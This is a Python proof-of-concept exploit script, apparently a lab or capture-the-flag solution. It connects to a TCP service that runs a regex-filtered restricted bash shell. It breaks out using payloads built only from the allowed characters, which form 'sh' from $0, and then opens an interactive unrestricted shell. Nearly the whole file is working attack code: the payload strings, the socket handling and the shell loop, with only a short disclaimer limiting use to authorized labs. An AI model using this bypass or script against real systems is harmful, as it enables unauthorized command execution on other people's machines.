"""
Disclaimer:
This proof-of-concept is provided for educational and authorized lab use only.
Do not run it against systems you do not own or do not have explicit permission to test.
"""

#!/usr/bin/env python3
"""
Broken Shell - Regex Bypass Exploit
====================================
Target: TCP service running a bash restricted shell filtered by:
    ^[${}![:space:]:_=()]+$

Technique:
  1. Pure assignment  __=$(( ))  sets __="0" silently.
     The read loop clobbers _ each iteration but leaves __ intact.
  2. Next eval: build "sh" from $0 (the script path) using only
     allowed chars.  Arithmetic inside ${var:OFFSET:LEN} is consumed
     internally and never emitted, so no numeric prefix appears.
       - pos  8 of $0 = 's'   (offset via octal "010" = 8)
       - pos  1 of $0 = 'h'   (offset 1)
  3. sh spawns unrestricted.  Send normal commands from there.
"""

import socket
import time
import re
import sys

# ── configure target ──────────────────────────────────────────────────────────
HOST = ""      # e.g. "0.0.0.0"
PORT = 0       # e.g. 0000
# ─────────────────────────────────────────────────────────────────────────────

# Payload pieces (all chars in [${}![:space:]:_=()] only)
STEP1 = "__=$(( ))"

STEP2 = (
    "${!__:$(( ___=$(( ))$(( !$(( )) ))$(( )) )):$(( !$(( )) ))}"
    "${!__:$(( !$(( )) )):$(( !$(( )) ))}"
)


def drain(s, timeout=2.0):
    """Read all pending data from socket."""
    s.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf


def send(s, line, delay=2.0):
    """Send a line and return the response."""
    s.send((line + "\n").encode())
    time.sleep(delay)
    raw = drain(s)
    text = re.sub(r"\x1b\[[^m]*m", "", raw.decode("utf-8", errors="replace"))
    return text.replace("\r", "")


def banner(s):
    """Read and discard the welcome banner."""
    s.settimeout(4)
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if b"$ " in buf[-30:]:
                break
    except socket.timeout:
        pass
    return buf


def interactive(s):
    """Drop into a simple interactive loop once sh is running."""
    sys.stdout.write("[sh] $ ")
    sys.stdout.flush()
    try:
        while True:
            cmd = input()
            if cmd.lower() in ("exit", "quit"):
                s.send(b"exit\n")
                break
            out = send(s, cmd, delay=2.0)
            # Strip the echoed command and trailing prompt
            lines = out.split("\n")
            for l in lines:
                stripped = l.strip()
                if stripped and stripped != cmd.strip() and stripped != "$":
                    print(stripped)
            sys.stdout.write("[sh] $ ")
            sys.stdout.flush()
    except (EOFError, KeyboardInterrupt):
        pass


def main():
    if not HOST or not PORT:
        print("Edit HOST and PORT at the top of this script first.")
        sys.exit(1)

    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.socket()
    s.settimeout(10)
    s.connect((HOST, PORT))
    time.sleep(1.5)
    banner(s)
    print("[*] Connected — got prompt")

    # Stage 1: persist __="0" across eval boundary
    print(f"[*] Stage 1: {STEP1}")
    out1 = send(s, STEP1, delay=1.0)
    print(f"    response: {out1.strip()!r}")

    # Stage 2: construct and execute "sh"
    print(f"[*] Stage 2: spawning sh")
    out2 = send(s, STEP2, delay=3.0)
    print(f"    response: {out2.strip()!r}")

    if "can't access tty" in out2 or "$ " in out2:
        print("[+] Shell spawned!  Dropping into interactive mode.")
        print("    (type 'exit' or Ctrl-C to quit)\n")
        interactive(s)
    else:
        print("[-] Shell may not have spawned.  Raw output above.")
        print("    You can still try sending commands manually:")
        while True:
            try:
                cmd = input("cmd> ")
            except (EOFError, KeyboardInterrupt):
                break
            print(send(s, cmd, delay=2.0))

    s.close()
    print("[*] Done.")


if __name__ == "__main__":
    main()
